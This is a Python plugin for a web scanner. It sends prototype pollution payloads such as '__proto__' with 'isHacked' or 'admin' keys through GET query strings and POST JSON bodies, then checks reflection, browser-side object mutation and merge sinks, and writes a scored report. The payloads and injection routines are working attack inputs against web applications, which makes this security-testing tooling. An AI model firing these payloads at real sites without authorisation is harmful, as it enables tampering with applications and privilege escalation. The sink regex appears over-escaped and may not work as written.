# plugins/proto_pollution.py

import os
import re
import json
import time
import difflib
import requests
from urllib.parse import urlparse, urljoin

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
except ModuleNotFoundError:
    webdriver = None
    Options = None

from bs4 import BeautifulSoup

# Expanded Payloads for prototype pollution
def get_payloads():
    return [
        {"__proto__": {"isHacked": True}},
        {"constructor": {"prototype": {"polluted": 1}}},
        {"__proto__": {"admin": True}},
        {"__proto__.polluted": "yes"},
        {"__proto__.toString": "polluted"},
        {"__proto__[test]": "polluted"},
        {"prototype[polluted]": "yes"},
        {"__proto__": {"test": "__PP__"}},
    ]

# Set up headless browser for DOM behavior testing
def setup_browser():
    if not webdriver or not Options:
        print("[!] Selenium not available. Skipping browser-based tests.")
        return None
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=chrome_options)
    return driver

# Inject payload into URL query string
def inject_payload(base_url, payload):
    for key, val in payload.items():
        full_url = f"{base_url}?{key}={json.dumps(val)}"
        yield full_url

# Inject payload via POST JSON
def inject_post_payload(session, url, payload):
    try:
        headers = {"Content-Type": "application/json"}
        r = session.post(url, json=payload, headers=headers, timeout=10)
        return r
    except Exception as e:
        print(f"[-] POST injection error at {url}: {e}")
        return None

# Basic reflection check
def is_reflected(response_text, payload):
    for key in payload.keys():
        if key in response_text:
            return True, key
    return False, None

# DOM check for mutation and prototype pollution validation
def check_dom_effect(driver, url):
    if not driver:
        return False, None
    try:
        driver.get(url)
        time.sleep(2)
        pollution_detected = driver.execute_script("return window.isHacked || Object.prototype.polluted || window.admin || Object.prototype.test")
        dom = driver.execute_script("return document.body.innerHTML")
        return pollution_detected, dom
    except Exception as e:
        return False, None

# Extract JS sink patterns
def extract_js_sinks(session, base_url):
    try:
        res = session.get(base_url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        scripts = soup.find_all("script")
        sink_hits = []
        pattern = re.compile(r'(Object\\.assign|\\.extend|_\\.merge)\\s*\\(')

        for script in scripts:
            if script.get("src"):
                js_url = urljoin(base_url, script["src"])
                try:
                    js_code = session.get(js_url, timeout=5).text
                    for match in pattern.finditer(js_code):
                        sink_hits.append((js_url, match.group()))
                except:
                    continue
            else:
                if script.string:
                    for match in pattern.finditer(script.string):
                        sink_hits.append((base_url, match.group()))
        return sink_hits
    except Exception as e:
        return []

# Save markdown report
def save_markdown_report(report_lines, output_file):
    with open(output_file, "w") as f:
        f.write("\n".join(report_lines))

# Save response diffs
def save_diff(base_html, test_html, diff_file):
    diff = difflib.unified_diff(
        base_html.splitlines(),
        test_html.splitlines(),
        lineterm='',
        n=3
    )
    with open(diff_file, "w") as f:
        f.write("\n".join(diff))

# Scoring based on observed behaviors
def calculate_score(reflected, dom_effect, sinks):
    score = 0
    if reflected:
        score += 2
    if dom_effect:
        score += 3
    if sinks:
        score += 3
    if dom_effect:
        score += 2  # extra if prototype keys are found
    return score

# Main scan logic
def scan(target, results_dir):
    session = requests.Session()
    driver = setup_browser()
    payloads = get_payloads()
    report = [f"# Prototype Pollution Scan Report for {target}\n"]
    hit_count = 0

    # Get baseline for diff
    try:
        baseline = session.get(target, timeout=10).text
    except:
        baseline = ""

    for payload in payloads:
        for test_url in inject_payload(target, payload):
            try:
                print(f"[GET] Testing: {test_url}")
                r = session.get(test_url, timeout=10)
                reflected, key = is_reflected(r.text, payload)
                dom_effect, dom_snapshot = check_dom_effect(driver, test_url)
                sinks = extract_js_sinks(session, target)
                score = calculate_score(reflected, dom_effect, sinks)

                if score > 0:
                    hit_count += 1
                    report.append(f"## Finding {hit_count}")
                    report.append(f"**Method**: GET")
                    report.append(f"**Score**: `{score}`")
                    report.append(f"**Risk Level**: `{['Low','Medium','High'][min(score//4,2)]}`")
                    report.append(f"**Tested URL**: `{test_url}`")
                    report.append(f"**Reflected**: `{reflected}` ({key})")
                    report.append(f"**DOM Mutation**: `{dom_effect}`")

                    if dom_snapshot:
                        dom_file = os.path.join(results_dir, f"dom_snapshot_get_{hit_count}.html")
                        with open(dom_file, "w") as f:
                            f.write(dom_snapshot)
                        report.append(f"**DOM Snapshot Saved**: `{dom_file}`")

                    diff_file = os.path.join(results_dir, f"response_diff_get_{hit_count}.diff")
                    save_diff(baseline, r.text, diff_file)
                    report.append(f"**Response Diff**: `{diff_file}`")

                    if sinks:
                        report.append("**Sink Matches in JS**:")
                        for js_url, match in sinks:
                            report.append(f"- `{match}` in `{js_url}`")
                    report.append("\n")
            except Exception as e:
                print(f"[-] Error in GET test: {e}")

        try:
            print(f"[POST] Testing: {target} with payload {payload}")
            r_post = inject_post_payload(session, target, payload)
            if r_post:
                reflected, key = is_reflected(r_post.text, payload)
                dom_effect, dom_snapshot = check_dom_effect(driver, target)
                sinks = extract_js_sinks(session, target)
                score = calculate_score(reflected, dom_effect, sinks)

                if score > 0:
                    hit_count += 1
                    report.append(f"## Finding {hit_count}")
                    report.append(f"**Method**: POST")
                    report.append(f"**Score**: `{score}`")
                    report.append(f"**Risk Level**: `{['Low','Medium','High'][min(score//4,2)]}`")
                    report.append(f"**Tested URL**: `{target}`")
                    report.append(f"**Payload**: `{json.dumps(payload)}`")
                    report.append(f"**Reflected**: `{reflected}` ({key})")
                    report.append(f"**DOM Mutation**: `{dom_effect}`")

                    if dom_snapshot:
                        dom_file = os.path.join(results_dir, f"dom_snapshot_post_{hit_count}.html")
                        with open(dom_file, "w") as f:
                            f.write(dom_snapshot)
                        report.append(f"**DOM Snapshot Saved**: `{dom_file}`")

                    diff_file = os.path.join(results_dir, f"response_diff_post_{hit_count}.diff")
                    save_diff(baseline, r_post.text, diff_file)
                    report.append(f"**Response Diff**: `{diff_file}`")

                    if sinks:
                        report.append("**Sink Matches in JS**:")
                        for js_url, match in sinks:
                            report.append(f"- `{match}` in `{js_url}`")
                    report.append("\n")
        except Exception as e:
            print(f"[-] Error in POST test: {e}")

    if driver:
        driver.quit()
    if hit_count == 0:
        print("[-] No vulnerabilities detected.")
    else:
        out_file = os.path.join(results_dir, "proto_pollution_report.md")
        save_markdown_report(report, out_file)
        print(f"[+] Report saved to: {out_file}")
